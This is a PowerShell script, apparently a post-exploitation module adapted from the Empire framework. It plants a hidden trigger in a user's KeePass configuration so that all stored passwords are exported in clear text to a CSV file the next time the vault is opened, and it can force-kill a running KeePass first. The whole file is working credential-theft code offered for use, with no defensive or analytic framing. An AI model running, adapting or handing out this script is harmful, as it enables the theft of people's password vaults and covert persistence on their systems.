function KeePassDump
{
<#
.SYNOPSIS
Dumps clear text credentials from KeePass on next usage of KeePass by setting a trigger in the users config.

.DESCRIPTION
The KeePassDump function backs up the current KeePass configuration, modifies the configuration file to include a trigger that will execute an action to export the credentials to a CSV file when KeePass is next used.

.PARAMETER Path
The path of the KeePass configuration file. This parameter is mandatory and the value must be a valid file path.

.PARAMETER ExportPath
The path where the CSV file with the dumped credentials will be saved. This parameter is optional, the default value is "${Env:APPDATA}\KeePass". The specified path must exist.

.EXAMPLE
Dump the credentials to the default export path while using the default config path (C:\Users\User\AppData\Roaming\KeePass\KeePass.config.xml)
KeePassDump

.EXAMPLE
Dump the credentials to a custom export path
KeePassDump C:\Users\User\AppData\Roaming\KeePass\KeePass.config.xml -ExportPath C:\Temp

.LINK
https://github.com/0i41E
https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/vaults/KeePassConfig.ps1

#Based on the script "KeePassConfig.ps1" from the EmpireProject
#>

    [CmdletBinding()]
    param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [Object[]]
        $Path = "${Env:APPDATA}\KeePass\KeePass.config.xml",

        [Parameter(Position = 2)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $ExportPath = "${Env:APPDATA}\KeePass"

    )
    
    if((Get-Process "KeePass" -ea SilentlyContinue) -eq $Null)
    { 
       Write-Host "[!]KeePass is not running" -ForegroundColor Yellow
    }
    else
    { 
    Write-Host "[!]Discovered running KeePass process - Kill KeePass process?" -ForegroundColor Red
    Start-Sleep -s 1;
    $response = Read-Host "Y/N?"
    if ($response -eq "Y") {
        Stop-Process -name "KeePass" -Force
        Write-Host "[+]Stopped running KeePass instance!" -ForegroundColor Green
    } 
    else 
    {
        Write-Host "[!]KeePass process not stopped" -ForegroundColor Red
    }
    }

Write-Host "[!]Backing up current KeePass configuration - modifying configuration file..." -ForegroundColor Yellow

Start-Sleep -s 3;
Copy $Path $ExportPath\Backup.KeePass.config.xml

            $TriggerXML = [xml] @"
<Trigger>
    <Guid>X1A/3Q1ca0WE58C4E5dj5w==</Guid>
    <Name>KeePassDump</Name>
    <Events>
        <Event>
            <TypeGuid>5f8TBoW4QYm5BvaeKztApw==</TypeGuid>
            <Parameters>
                <Parameter>0</Parameter>
                <Parameter />
            </Parameters>
        </Event>
    </Events>
    <Conditions />
    <Actions>
        <Action>
            <TypeGuid>D5prW87VRr65NO2xP5RIIg==</TypeGuid>
            <Parameters>
                <Parameter>$ExportPath\{DB_BASENAME}.csv</Parameter>
                <Parameter>KeePass CSV (1.x)</Parameter>
                <Parameter />
                <Parameter />
            </Parameters>
        </Action>
    </Actions>
</Trigger>
"@;
            
Write-Host "[+]Clear text credentials dumped to $ExportPath at next usage of KeePass" -ForegroundColor Green

	ForEach($Object in $Path) {
            if($Object -is [String]) {
                $KeePassXMLPath = $Object
            }
            elseif ($Object.PSObject.Properties['KeePassConfigPath']) {
                $KeePassXMLPath = [String]$Object.KeePassConfigPath
            }
            elseif ($Object.PSObject.Properties['Path']) {
                $KeePassXMLPath = [String]$Object.Path
            }
            elseif ($Object.PSObject.Properties['FullName']) {
                $KeePassXMLPath = [String]$Object.FullName
            }
            else {
                $KeePassXMLPath = [String]$Object
            }

            if($KeePassXMLPath -and ($KeePassXMLPath -match '.\.xml$') -and (Test-Path -Path $KeePassXMLPath) ) {
                $KeePassXMLPath = Resolve-Path -Path $KeePassXMLPath

                $KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)
                
                $RandomGUID = [System.GUID]::NewGuid().ToByteArray()

                if ($KeePassXML.Configuration.Application.TriggerSystem.Triggers -is [String]) {
                    $Triggers = $KeePassXML.CreateElement('Triggers')
                    $Null = $Triggers.AppendChild($KeePassXML.ImportNode($TriggerXML.Trigger, $True))
                    $Null = $KeePassXML.Configuration.Application.TriggerSystem.ReplaceChild($Triggers, $KeePassXML.Configuration.Application.TriggerSystem.SelectSingleNode('Triggers'))
                }
                else {
                    $Null = $KeePassXML.Configuration.Application.TriggerSystem.Triggers.AppendChild($KeePassXML.ImportNode($TriggerXML.Trigger, $True))
                }

                $KeePassXML.Save($KeePassXMLPath);

                Start-Sleep -s 3;

                Write-Host "[+]$KeePassXMLPath modified" -ForegroundColor Green
            }
        }
}